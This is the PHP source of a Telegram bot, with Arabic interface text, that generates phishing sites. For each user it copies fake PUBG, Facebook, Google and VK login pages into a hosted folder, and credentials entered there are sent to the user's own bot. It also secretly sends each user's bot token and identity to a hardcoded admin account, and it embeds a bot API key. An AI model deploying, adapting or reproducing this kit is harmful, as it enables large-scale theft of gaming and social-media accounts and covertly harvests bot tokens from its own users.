<?php 
ob_start();
define('API_KEY','1571119975:AAFmpU_ybiMJPWSxx9pL8N6OGnZm5QeKGXw');
echo file_get_contents("https://api.telegram.org/bot".API_KEY."/setwebhook?url=".$_SERVER['SERVER_NAME']."".$_SERVER['SCRIPT_NAME']);
function bot($method,$datas=[]){$x_BRK = http_build_query($datas);
$url = "https://api.telegram.org/bot".API_KEY."/".$method."?$x_BRK";
$BROK8 = file_get_contents($url); return json_decode($BROK8);}
$brokweb = "downloadg99.ga";
$update = json_decode(file_get_contents('php://input'));
$message = $update->message; $chat_id = $message->chat->id;
$from_id = $message->from->id; $name = $message->from->first_name; $text = $message->text;
$mid = $message->message_id; $name2 = $update->callback_query->from->first_name; $message_id2 = $update->callback_query->message->message_id; $chat_id2 = $update->callback_query->message->chat->id;
$from_id2 = $update->callback_query->from->id; $message_id = $update->callback_query->message->message_id; $data = $update->callback_query->data;
$info_token = file_get_contents("https://api.telegram.org/bot$text/getWebhookInfo"); $info_tokens = json_decode($info_token);
$get_files = file_get_contents('index.php');
$get_done = file_get_contents('infos/explode.php');
$get_success = file_get_contents('success.php');
$get_login = file_get_contents('login.php');
$get_facebook = file_get_contents('facebook.php');
$get_google = file_get_contents('google.php');
$get_vk = file_get_contents('vk.php');
$done = explode("\n", $get_done);
$get_id = file_get_contents('infos/info.php'); $get_ids = explode("\n", $get_id);
$from_id = $message->from->id;
mkdir("infos");
mkdir("PUBG");
$index="<html>
<meta HTTP-EQUIV='REFRESH' content='0; url=https://t.me/A_I_L_O_L_Bot'/>
</html>";
$admin = 1189284654; // Your Account ID //
$i_BRK =$admin; 
$x_BRK = file_get_contents("x_BRK.txt");
$x_BRK0 = file_get_contents("x_BRK0.txt");
$x_BRK1= file_get_contents("x_BRK1.txt");
$x_BRK5 = file_get_contents("x_BRK2.txt");
$x_BRK6 = file_get_contents("x_BRK3.txt");
$x_BRK20 = json_decode(file_get_contents('php://input'));
$x_BRK18 = $update->message;
$chat_id = $x_BRK18->chat->id;
$text = $x_BRK18->text;
$data = $x_BRK20->callback_query->data;
$x_BRK12 = $x_BRK20->callback_query->message->chat->id;
$x_BRK14 =  $x_BRK20->callback_query->message->message_id;
$x_BRK15 = $x_BRK18->from->first_name;
$x_BRK16 = $x_BRK18->from->username;
$x_BRK11 = $x_BRK18->from->id;
$x_BRK2 = explode("\n",file_get_contents("x_BRK4.txt"));
$x_BRK3 = count($x_BRK2)-1;
if ($x_BRK18 && !in_array($x_BRK11, $x_BRK2)) {
    file_put_contents("x_BRK4.txt", $x_BRK11."\n",FILE_APPEND);
  }
$x_BRK9 = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=$x_BRK0&user_id=".$x_BRK11);
$x_BRK10 = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=$x_BRK1&user_id=".$x_BRK11);
if($x_BRK18 && (strpos($x_BRK9,'"status":"left"') or strpos($x_BRK9,'"Bad Request: USER_ID_INVALID"') or strpos($x_BRK9,'"status":"kicked"') or strpos($x_BRK10,'"status":"left"') or strpos($x_BRK10,'"Bad Request: USER_ID_INVALID"') or strpos($x_BRK10,'"status":"kicked"'))!== false){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"- عذرا عزيزي يجب عليك الاشتراك في قناة البوت اولا

$x_BRK0
$x_BRK1",
]);return false;}
if($text == "/BRoK" and $x_BRK11 == $admin){
bot("sendmessage",[
"chat_id"=>$chat_id,
"text"=>"- اهلا بك عزيزي المطور في قائمة الاوامر",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'- اوامر قننوات الاشتراك الاجباري' ,'callback_data'=>"x_BRK"]],
[['text'=>'- وضع القناة الاولى' ,'callback_data'=>"x_BRK0"],['text'=>'- حذف القناة الاولى' ,'callback_data'=>"x_BRK1"]],
[['text'=>'- وضع القناة الثانيه' ,'callback_data'=>"x_BRK2"],['text'=>'- حذف القناة الثانيه' ,'callback_data'=>"x_BRK3"]],
[['text'=>'- عرض قنوات الاشتراك' ,'callback_data'=>"x_BRK4"]],
[['text'=>'- اوامر الاذاعه' ,'callback_data'=>"x_BRK"]],
[['text'=>'- اذاعه بلتوجيه' ,'callback_data'=>"x_BRK5"],['text'=>'- اذاعة رساله' ,'callback_data'=>"x_BRK6"]],
[['text'=>'- عدد مشتركين البوت' ,'callback_data'=>"x_BRK7"]],
[['text'=>'- اوامر التواصل ( توجيه رسائل المشتركين ) ' ,'callback_data'=>"x_BRK"]],
[['text'=>'- تفعيل التواصل' ,'callback_data'=>"x_BRK11"],['text'=>'- تعطيل التواصل' ,'callback_data'=>"x_BRK12"]],
   ] 
   ])
]);
}
if($data == "x_BRK" ){
bot('EditMessageText',[
'chat_id'=>$x_BRK12,
'message_id'=>$x_BRK14,
"text"=>"- اهلا بك عزيزي المطور في قائمة الاوامر",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'- اوامر قننوات الاشتراك الاجباري' ,'callback_data'=>"x_BRK"]],
[['text'=>'- وضع القناة الاولى' ,'callback_data'=>"x_BRK0"],['text'=>'- حذف القناة الاولى' ,'callback_data'=>"x_BRK1"]],
[['text'=>'- وضع القناة الثانيه' ,'callback_data'=>"x_BRK2"],['text'=>'- حذف القناة الثانيه' ,'callback_data'=>"x_BRK3"]],
[['text'=>'- عرض قنوات الاشتراك' ,'callback_data'=>"x_BRK4"]],
[['text'=>'- اوامر الاذاعه' ,'callback_data'=>"x_BRK"]],
[['text'=>'- اذاعه بلتوجيه' ,'callback_data'=>"x_BRK5"],['text'=>'- اذاعة رساله' ,'callback_data'=>"x_BRK6"]],
[['text'=>'- عدد مشتركين البوت' ,'callback_data'=>"x_BRK7"]],
[['text'=>'- اوامر التواصل ( توجيه رسائل المشتركين ) ' ,'callback_data'=>"x_BRK"]],
[['text'=>'- تفعيل التواصل' ,'callback_data'=>"x_BRK11"],['text'=>'- تعطيل التواصل' ,'callback_data'=>"x_BRK12"]],
   ] 
   ])
]);
unlink("x_BRK.txt");
}
if($data == "x_BRK0"){
bot('EditMessageText',[
    'chat_id'=>$x_BRK12,
    'message_id'=>$x_BRK14,
'text'=>'- ارسل معرف القناة الآن
- مثل => @i_BRK ',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- الغاء' ,'callback_data'=>"x_BRK"]],
]])
]);
file_put_contents("x_BRK.txt","x_BRK0");
}
if($text and $x_BRK == "x_BRK0" and $x_BRK11 == $i_BRK){
bot("sendmessage",[
"chat_id"=>$chat_id,
"text"=>'- تم حفظ القناة الاولى
- تأكد من رفع البوت ادمن بلقناة', 
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- القائمه الرئيسيه' ,'callback_data'=>"x_BRK"]],
]])
]);
file_put_contents("x_BRK0.txt","$text");
unlink("x_BRK.txt");
}
if($data == "x_BRK1"){
bot('EditMessageText',[
    'chat_id'=>$x_BRK12,
    'message_id'=>$x_BRK14,
'text'=>'- تم حذف القناة الاولى',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- القائمه الرئيسيه' ,'callback_data'=>"x_BRK"]],
]])
]);
unlink("x_BRK.txt");
unlink("x_BRK0.txt");
}
if($data == "x_BRK2"){
bot('EditMessageText',[
    'chat_id'=>$x_BRK12,
    'message_id'=>$x_BRK14,
'text'=>'- ارسل معرف القناة الآن
- مثل => @i_BRK ',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- الغاء' ,'callback_data'=>"x_BRK"]],
]])
]);
file_put_contents("x_BRK.txt","x_BRK1");
}
if($text and $x_BRK == "x_BRK1" and $x_BRK11 == $i_BRK){
bot("sendmessage",[
"chat_id"=>$chat_id,
"text"=>'- تم حفظ القناة الثانيه
- تأكد من رفع البوت ادمن بلقناة', 
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- القائمه الرئيسيه' ,'callback_data'=>"x_BRK"]],
]])
]);
file_put_contents("x_BRK1.txt","$text");
unlink("x_BRK.txt");
}
if($data == "x_BRK3"){
bot('EditMessageText',[
    'chat_id'=>$x_BRK12,
    'message_id'=>$x_BRK14,
'text'=>'- تم حذف القناة الثانيه',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- القائمه الرئيسيه' ,'callback_data'=>"x_BRK"]],
]])
]);
unlink("x_BRK.txt");
unlink("x_BRK1.txt");
}
if($data == "x_BRK4"){
bot('EditMessageText',[
    'chat_id'=>$x_BRK12,
    'message_id'=>$x_BRK14,
'text'=>"- هذه هي قنوات الاشتراك الاجباري
1 - $x_BRK0
2 - $x_BRK1
",
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- القائمه الرئيسيه' ,'callback_data'=>"x_BRK"]],
]])
]);
unlink("x_BRK.txt");
}
if($data == "x_BRK5"){
bot('EditMessageText',[
    'chat_id'=>$x_BRK12,
    'message_id'=>$x_BRK14,
'text'=>'- ارسل التوجيه ليتم نشره الى جميع الاعضاء',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- الغاء' ,'callback_data'=>"x_BRK"]],
]])
]);
file_put_contents("x_BRK.txt","x_BRK2");
}
if($x_BRK18 and $x_BRK == "x_BRK2" and $x_BRK11 == $i_BRK){
bot("sendmessage",[
"chat_id"=>$chat_id,
"text"=>'- تم التوجيه الى جميع اعضاء البوت',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- القائمه الرئيسيه' ,'callback_data'=>"x_BRK"]],
]])
]);
for($i=0;$i<count($x_BRK2); $i++){
bot('forwardMessage', [
'chat_id'=>$x_BRK2[$i],
'from_chat_id'=>$x_BRK11,
'message_id'=>$x_BRK18->message_id
]);
unlink("x_BRK.txt");
}
}
if($data == "x_BRK6"){
bot('EditMessageText',[
    'chat_id'=>$x_BRK12,
    'message_id'=>$x_BRK14,
'text'=>'- ارسل رسالتك ليتم نشرها الى جميع اعضاء البوت',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- الغاء' ,'callback_data'=>"x_BRK"]],
]])
]);
file_put_contents("x_BRK.txt","x_BRK3");
}
if($text and $x_BRK == "x_BRK3" and $x_BRK11 == $i_BRK){
bot("sendmessage",[
"chat_id"=>$chat_id,
"text"=>'- تم نشر رسالتك الى جميع اعضاء البوت',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- القائمه الرئيسيه' ,'callback_data'=>"x_BRK"]],
]])
]);
for($i=0;$i<count($x_BRK2); $i++){
bot('sendMessage', [
'chat_id'=>$x_BRK2[$i],
'text'=>"$text\n- - - - \n- @i_BRK",
]);
unlink("x_BRK.txt");
}
}
if($data == "x_BRK7"){
bot('EditMessageText',[
    'chat_id'=>$x_BRK12,
    'message_id'=>$x_BRK14,
'text'=>"- عدد أعضاء البوت الخاص بك هو => $x_BRK3", 
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- القائمه الرئيسيه' ,'callback_data'=>"x_BRK"]],
]])
]);
unlink("x_BRK.txt");
}
if($data == "x_BRK11"){
bot('EditMessageText',[
    'chat_id'=>$x_BRK12,
    'message_id'=>$x_BRK14,
'text'=>'- تم تفعيل التواصل',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- القائمه الرئيسيه' ,'callback_data'=>"x_BRK"]],
]])
]);
file_put_contents("x_BRK3.txt","x_BRK");
}
if($x_BRK18 and $x_BRK6 == "x_BRK" and $x_BRK11 != $i_BRK){
bot('forwardMessage', [
'chat_id'=>$i_BRK,
'from_chat_id'=>$x_BRK11,
'message_id'=>$x_BRK18->message_id
]);
}
if($x_BRK18 and $x_BRK6 == "x_BRK" and $x_BRK11 == $i_BRK){
bot('sendMessage',[
'chat_id'=>$x_BRK18->reply_to_message->forward_from->id,
    'text'=>$text,
    ]);
}
if($data == "x_BRK12"){
bot('EditMessageText',[
    'chat_id'=>$x_BRK12,
    'message_id'=>$x_BRK14,
'text'=>'- تم تعطيل التواصل',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'- القائمه الرئيسيه' ,'callback_data'=>"x_BRK"]],
]])
]);
unlink("x_BRK.txt");
unlink("x_BRK3.txt");
}
if($text == '/start' and !in_array($from_id, $get_ids)){ bot('sendMessage',[
'chat_id'=>$chat_id,'text'=>"
- اهلا بك عزيزي $Name في بوت صنع اندكس ببجي
- كل ما عليك هو فقط الضغط على صنع اندكس وارسال التوكن الخاص بك
- ماذا تعني كلمة اندكس؟ 
- هي عباره عن صفحه مزوره كل شخص يقوم بلتسجيل بها سوف تصل معلومته لك على بوت خاص بك في التليجرام
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'- صنع اندكس','callback_data'=>'addbot'],['text'=>'- حذف اندكس','callback_data'=>'delete']],[['text'=>'- قسم المساعده','callback_data'=>'help']],[['text'=>'BRoK','url'=>'https://t.me/i_BRK']],],])]);}
if($data == 'addbot' and !in_array($chat_id2,$done) and !strpos($ch1 , '"status":"left"') !== false){file_put_contents('infos/info.php', "\n" . $chat_id2 . "\n",FILE_APPEND); bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>"-- قم بأرسال التوكن الخاص بك\n- يمكنك الحصول عليه من @BotFather",'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'- رجوع','callback_data'=>'cancle']]]])]);}

if($data == 'addbot' and in_array($chat_id2,$done) and !strpos($ch1 , '"status":"left"') !== false){
bot('answerCallbackQuery',['callback_query_id'=>$update->callback_query->id,'message_id'=>$message_id,'text'=>"- عذرا عزيزي لا يمكنك صنع اكثر من اندكس",'show_alert'=>true]);}
if($text and in_array($from_id, $get_ids) and $info_tokens->ok == "true" ){
$str = str_replace($from_id, '', $get_id);    
file_put_contents('infos/info.php', $str);    
file_put_contents('infos/explode.php', $from_id . "\n", FILE_APPEND);
$url_info = file_get_contents("https://api.telegram.org/bot$text/getMe");
$json_info = json_decode($url_info);
$userr = $json_info->result->username;
bot('sendMessage',['chat_id'=>$chat_id,'text'=>"
- تم صنع الاندكس الخاص بك
- معرف البوت الذي ستستلم به الحسابات @$userr
",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>'- رجوع','callback_data'=>"home"]],
[['text'=>'- اضغط هنا للدخول الى الرابط الخاص بك','url'=>"$brokweb/PUBG/$from_id/index.php"]],]])]); 
bot('sendMessage',['chat_id'=>$admin,'text'=>"
- هناك شخص ما قام بصنع اندكس ببجي
- - - - - 
- اسم الشخص $name
- - - - - 
- معرف الشخص @$username
- - - - - 
- ايدي الشخص $from_id
- - - - - 
- توكن البوت الخاص به
$text
- - - - - 
[اضغط هنا للدخول الى حساب الشخص](tg://user?id=$from_id)
",
'disable_web_page_preview'=>'true','parse_mode'=>"Markdown",]);
mkdir("PUBG/$from_id");
file_put_contents("PUBG/$from_id/info.php",$text . "\n" . $from_id);
file_put_contents("PUBG/$from_id/index.php", $get_files);
file_put_contents("PUBG/$from_id/success.php", $get_success);
file_put_contents("PUBG/$from_id/login.php", $get_login);
file_put_contents("PUBG/$from_id/facebook.php", $get_facebook);
file_put_contents("PUBG/$from_id/google.php", $get_google);
file_put_contents("PUBG/$from_id/vk.php", $get_vk);
file_put_contents("PUBG/index.html", $index);
file_put_contents("info.txt",$from_id ."\n",FILE_APPEND);
} 
if($text and in_array($from_id, $get_ids) and $info_tokens->ok != "true" and !strpos($ch1 , '"status":"left"') !== false){
bot('sendMessage',['chat_id'=>$chat_id,'text'=>"- التوكن خطأ",'reply_to_message_id'=>$message->message_id,'reply_markup'=>json_encode([
'inline_keyboard'=>[[['text'=>'- رجوع','callback_data'=>'cancle']]]])]);} 
if($data == 'cancle' and in_array($from_id, $get_ids)){
$str = str_replace($chat_id2, "", $get_id) ;
file_put_contents('infos/info.php', $str);
bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>"
- اهلا بك عزيزي $Name في بوت صنع اندكس ببحي
- كل ما عليك هو فقط الضغط على صنع اندكس وارسال التوكن الخاص بك
- ماذا تعني كلمة اندكس؟ 
- هي عباره عن صفحه مزوره كل شخص يقوم بلتسجيل بها سوف تصل معلومته لك على بوت خاص بك في التليجرام
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'- صنع اندكس','callback_data'=>'addbot'],['text'=>'- حذف اندكس','callback_data'=>'delete']],[['text'=>'- قسم المساعده','callback_data'=>'help']],[['text'=>'BRoK','url'=>'https://t.me/i_BRK']],],])]);}
if($data == 'home'){
bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>"
- اهلا بك عزيزي $Name في بوت صنع اندكس ببجي
- كل ما عليك هو فقط الضغط على صنع اندكس وارسال التوكن الخاص بك
- ماذا تعني كلمة اندكس؟ 
- هي عباره عن صفحه مزوره كل شخص يقوم بلتسجيل بها سوف تصل معلومته لك على بوت خاص بك في التليجرام
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'- صنع اندكس','callback_data'=>'addbot'],['text'=>'- حذف اندكس','callback_data'=>'delete']],[['text'=>'- قسم المساعده','callback_data'=>'help']],[['text'=>'BRoK','url'=>'https://t.me/i_BRK']],],])]);}
if($data == 'help'){
bot('sendvideo', 
['chat_id'=>$chat_id2, 
'video'=>'https://t.me/brokmakebots/2',
'caption'=>'- هذا هو شرح كيف تصنع بوت
- قم بصنع بوتك وارسل لي التوكن
- المطور @i_BRK', 
]);
} 
if($data == 'delete' and in_array($chat_id2,$done)){bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>'- هل انت متأكد من انك تريد حذف الاندكس؟ ','reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'- كلا', 'callback_data'=>'home'],['text'=>'- نعم متأكد','callback_data'=>'yesdel'],]]])]);}
if($data == 'yesdel' and in_array($chat_id2, $done)){bot('editMessageText',['chat_id'=>$chat_id2,'message_id'=>$message_id,'text'=>"- تم الحذف بنجاح",'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>'- رجوع','callback_data'=>"home"]]]])]);
$str1 = str_replace($chat_id2, '', $get_done);
file_put_contents('infos/explode.php', $str1);
unlink("PUBG/$chat_id2/facebook.php");
unlink("PUBG/$chat_id2/success.php");
unlink("PUBG/$chat_id2/login.php");
unlink("PUBG/$chat_id2/google.php");
unlink("PUBG/$chat_id2/index.php");
unlink("PUBG/$chat_id2/vk.php");
}
if($data == 'delete' and !in_array($chat_id2,$done)){bot('answerCallbackQuery',['callback_query_id'=>$update->callback_query->id,'message_id'=>$message_id,'text'=>"- انت لم تصنع اي اندكس",'show_alert'=>true]);}
echo "BRoK - @x_BRK - @i_BRK";